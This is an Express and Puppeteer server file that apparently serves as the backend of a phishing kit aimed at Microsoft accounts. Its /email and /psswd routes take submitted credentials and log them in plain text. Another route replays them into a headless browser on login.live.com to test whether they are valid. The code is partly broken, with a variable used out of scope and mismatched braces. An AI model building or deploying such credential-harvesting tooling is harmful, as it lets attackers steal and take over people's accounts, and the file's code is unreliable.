const express = require('express');
const puppeteer = require('puppeteer');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 6282;

app.use(cors());
app.use(bodyParser.json());



let browser; // Keep a reference to the browser instance
let page; // Keep a reference to the page instance

async function loginLive(email, password) {
    if (!page) {
        throw new Error('Page not initialized');
    }

    // Enter email using copy-paste
    await page.evaluate(text => navigator.clipboard.writeText(text), email);
    await page.click('input[name="loginfmt"]');
    await page.keyboard.down('Control');
    await page.keyboard.press('V');
    await page.keyboard.up('Control');
    console.log('Email pasted');

    // Click "Next" button
    await page.waitForSelector('button#idSIButton9', { visible: true, timeout: 10000 });
    await page.click('button#idSIButton9');
    console.log('Clicked Next');

    // Check for the error after clicking "Next"
    try {
        await page.waitForSelector('div#i0116Error', { visible: true, timeout: 5000 });
        console.log('Incorrect email detected');
        await page.goto('https://login.live.com');
        console.log('redirected to login.live');

        return { success: false, message: 'Incorrect email' };
    } catch (error) {
        console.log('Email appears to be correct, proceeding...');
    }

    // Wait for the password field and enter password using copy-paste
    await page.waitForSelector('input[name="passwd"]', { visible: true });
    await page.evaluate(text => navigator.clipboard.writeText(text), password);
    await page.click('input[name="passwd"]');
    await page.keyboard.down('Control');
    await page.keyboard.press('V');
    await page.keyboard.up('Control');
    console.log('Password pasted');

    // Click "Sign in" button
    await page.click('button#idSIButton9');
    console.log('Clicked Sign in');
    
    // Check for the error after clicking "Next"
    try {
        await page.waitForSelector('div#i0118Error', { visible: true, timeout: 5000 });
        console.log('Incorrect password detected');
        await page.goto('https://login.live.com');
        console.log('redirected to login.live');
        
        return { success: false, message: 'Incorrect password' };
    } catch (error) {
        console.log('Password appears to be correct, proceeding...');
    }

    await page.close(); // Close the page after login
    return { success: true };

    /* // Handle "Stay signed in?" prompt
    console.log('Waiting for "Stay signed in" button');
    await page.waitForSelector('button#declineButton', { visible: true, timeout: 10000 });
    await page.click('button#declineButton');
    console.log('Clicked Stay signed in');

    await page.close(); // Close the page after login
    return { success: true }; */
} 




async function startBrowser() {
  browser = await puppeteer.launch({
      headless: true,
      executablePath: '/opt/render/project/.render/chrome/opt/google/chrome/google-chrome',
      args: ['--no-sandbox']
  });
  console.log('Browser launched');

  page = await browser.newPage();
  console.log('New page created');

  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36');
  await page.setViewport({ width: 1280, height: 800 });

  await page.goto('https://login.live.com', { waitUntil: 'networkidle2' });
  console.log('Navigated to login.live.com');
}



let userData = {};

// Route to receive the email
app.post('/email', async (req, res) => {
  userData.email = req.body.email;
  console.log('Received email:', userData.email);
  res.json({ message: 'Email received successfully' });
});

// Route to receive the password
app.post('/psswd', async (req, res) => {
  userData.password = req.body.password;
  console.log('Received password:', userData.password);
  res.json({ message: 'Password received successfully' });
});

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Route to send email and password to another API
app.post('/bhenchod', async (req, res) => {
  if (userData.email && userData.password) {

    // bvfhgfghygv yghhg
    
    const email = userData.email;
    const password = userData.password;

    if (!email || !password) {
        return res.status(502).send('Email and password are required');
    }

    try {
        const loginResult = await loginLive(email, password);
        if (!loginResult.success) {
            return loginResult.message;
        }
        res.status(200).send('Logged in successfully');
    } catch (error) {
        console.error('Error during login:', error);
        res.status(501).send('Login failed');
    }

    // Restart the browser after login
    await browser.close();
    console.log('Browser closed');

    await startBrowser();


    // hffgggggfff

        // Check for specific messages and send appropriate status codes
        if (loginResult.message === 'Incorrect password') {
          res.sendStatus(401);  // Unauthorized
        } else if (loginResult.message === 'Incorrect email') {
          res.sendStatus(400);  // Bad Request
        }
      } else {
        // Network or other error, send a 500 status
        res.status(500).json({ message: 'Internal Server Error' });
      }
});


// Start the browser initially
startBrowser().then(() => {
  // Start the Express server
  app.listen(PORT, () => {
      console.log(`Server is running on port ${PORT}`);
  });
});

